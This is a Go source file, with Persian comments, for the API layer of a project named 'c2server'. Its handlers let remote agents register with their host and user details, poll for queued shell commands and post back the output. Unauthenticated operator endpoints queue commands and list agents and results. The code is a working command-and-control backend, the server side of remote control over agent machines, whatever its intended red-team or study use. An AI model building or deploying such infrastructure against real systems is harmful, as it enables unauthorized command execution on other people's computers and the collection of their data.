package api

import (
	"encoding/json"
	"log/slog"
	"net/http"
	"sync"

	"c2server/internal/history"
	"c2server/internal/model"
	"c2server/internal/queue"
	"c2server/internal/store"
)

// Handler وابستگی‌ها را از بیرون دریافت می‌کند (Dependency Injection)
type Handler struct {
	store   store.Store
	queue   queue.Queue
	history history.Recorder
	logger  *slog.Logger

	mu      sync.Mutex
	pending map[string]int64 // agentID → history entry ID در حال اجرا
}

func NewHandler(s store.Store, q queue.Queue, h history.Recorder, logger *slog.Logger) *Handler {
	return &Handler{
		store:   s,
		queue:   q,
		history: h,
		logger:  logger,
		pending: make(map[string]int64),
	}
}

// POST /register
func (h *Handler) register(w http.ResponseWriter, r *http.Request) {
	var info model.SystemInfo
	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body: "+err.Error())
		return
	}

	agent, err := h.store.Register(info)
	if err != nil {
		h.logger.Error("register failed", "error", err)
		writeError(w, http.StatusInternalServerError, "register failed")
		return
	}

	h.logger.Info("agent registered", "id", agent.ID, "host", info.Host, "user", info.User)
	writeJSON(w, http.StatusOK, map[string]string{"id": agent.ID})
}

// GET /task?id=...
func (h *Handler) task(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing id")
		return
	}

	if _, err := h.store.Get(id); err != nil {
		writeError(w, http.StatusNotFound, "unknown agent")
		return
	}
	_ = h.store.Touch(id)

	cmd, ok := h.queue.Dequeue(id)
	if !ok {
		writeJSON(w, http.StatusOK, model.Task{Command: ""})
		return
	}

	// ثبت سابقه با خروجی خالی (وضعیت «در حال اجرا»)
	entryID, _ := h.history.Begin(id, cmd)
	h.mu.Lock()
	h.pending[id] = entryID
	h.mu.Unlock()

	h.logger.Info("task dispatched", "id", id, "command", cmd)
	writeJSON(w, http.StatusOK, model.Task{Command: cmd})
}

// POST /result?id=...
func (h *Handler) result(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing id")
		return
	}

	var res model.Result
	if err := json.NewDecoder(r.Body).Decode(&res); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body: "+err.Error())
		return
	}

	h.mu.Lock()
	entryID := h.pending[id]
	delete(h.pending, id)
	h.mu.Unlock()

	if entryID != 0 {
		_ = h.history.Complete(entryID, res.Output)
	}

	h.logger.Info("result received", "id", id, "output", res.Output)
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}

// POST /queue?id=...
func (h *Handler) queueCmd(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing id")
		return
	}

	var task model.Task
	if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body: "+err.Error())
		return
	}
	if task.Command == "" {
		writeError(w, http.StatusBadRequest, "empty command")
		return
	}

	if err := h.queue.Enqueue(id, task.Command); err != nil {
		h.logger.Error("enqueue failed", "error", err)
		writeError(w, http.StatusInternalServerError, "enqueue failed")
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"status": "queued"})
}

// GET /agents
func (h *Handler) agents(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, h.store.List())
}

// GET /results?id=...  ← خروجی سوابق برای پنل
func (h *Handler) results(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing id")
		return
	}
	writeJSON(w, http.StatusOK, h.history.List(id))
}

// ---------- helpers ----------

func writeJSON(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

func writeError(w http.ResponseWriter, status int, msg string) {
	writeJSON(w, status, map[string]string{"error": msg})
}
